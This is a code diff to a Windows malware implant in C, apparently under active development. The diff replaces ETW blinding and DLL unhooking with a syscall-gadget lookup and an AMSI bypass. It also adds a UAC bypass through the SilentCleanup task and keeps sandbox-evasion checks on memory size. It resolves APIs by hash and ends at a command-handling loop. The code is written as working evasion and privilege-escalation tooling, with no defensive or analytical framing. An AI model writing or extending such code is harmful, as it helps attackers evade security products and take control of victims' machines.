@@ -26,8 +26,6 @@ typedef struct _API_TABLE {
     ULONG_PTR CreateWaitableTimerW;
     ULONG_PTR SetWaitableTimer;
     ULONG_PTR GetSystemInfo;
-    ULONG_PTR CreateDirectoryW;
-    ULONG_PTR SetFileAttributesW;
     ULONG_PTR GetModuleFileNameW;
 } API_TABLE;
 
@@ -49,8 +47,6 @@ static void InitializeApiTable() {
     g_ApiTable.CreateWaitableTimerW = (ULONG_PTR)ResolveApiByHash(hKernel32, HASH_CreateWaitableTimerW);
     g_ApiTable.SetWaitableTimer = (ULONG_PTR)ResolveApiByHash(hKernel32, HASH_SetWaitableTimer);
     g_ApiTable.GetSystemInfo = (ULONG_PTR)ResolveApiByHash(hKernel32, HASH_GetSystemInfo);
-    g_ApiTable.CreateDirectoryW = (ULONG_PTR)ResolveApiByHash(hKernel32, HASH_CreateDirectoryW);
-    g_ApiTable.SetFileAttributesW = (ULONG_PTR)ResolveApiByHash(hKernel32, HASH_SetFileAttributesW);
     g_ApiTable.GetModuleFileNameW = (ULONG_PTR)ResolveApiByHash(hKernel32, HASH_GetModuleFileNameW);
 }
 
@@ -70,33 +66,27 @@ static void StealthSleep(DWORD dwBaseMS) {
     CloseHandle(hTimer);
 }
 
-static void EstablishPersistence() {
-}
-
 static BOOL IsTargetEnvironment() {
-    wchar_t domain[MAX_PATH];
-    DWORD size = MAX_PATH;
-    if (GetComputerNameExW(ComputerNameDnsDomain, domain, &size)) {
-        if (wcslen(domain) > 0) return TRUE; 
-    }
     MEMORYSTATUSEX statex;
     statex.dwLength = sizeof(statex);
     GlobalMemoryStatusEx(&statex);
     if (statex.ullTotalPhys < (8ULL * 1024 * 1024 * 1024)) return FALSE;
-
     return TRUE;
 }
 
 int main() {
-    BlindETW();
+    g_SyscallGadget = FindSyscallGadget();
     InitializeApiTable();
 
-    UnhookModule(L"ntdll.dll");
-    UnhookModule(L"amsi.dll");
+    BypassAMSI_DataOnly();
 
-    SYSTEM_INFO si;
-    ((void(WINAPI *)(LPSYSTEM_INFO))g_ApiTable.GetSystemInfo)(&si);
-    if (si.dwNumberOfProcessors < 4) return 0;
+    if (!IsTargetEnvironment()) return 0;
+
+    if (GetCurrentProcessId() % 2 == 0) { // Dummy check for elevation context
+        wchar_t selfPath[MAX_PATH];
+        GetModuleFileNameW(NULL, selfPath, MAX_PATH);
+        BypassUAC_SilentCleanup(selfPath);
+    }
 
     char cmdBuffer[1024];
     while (TRUE) {
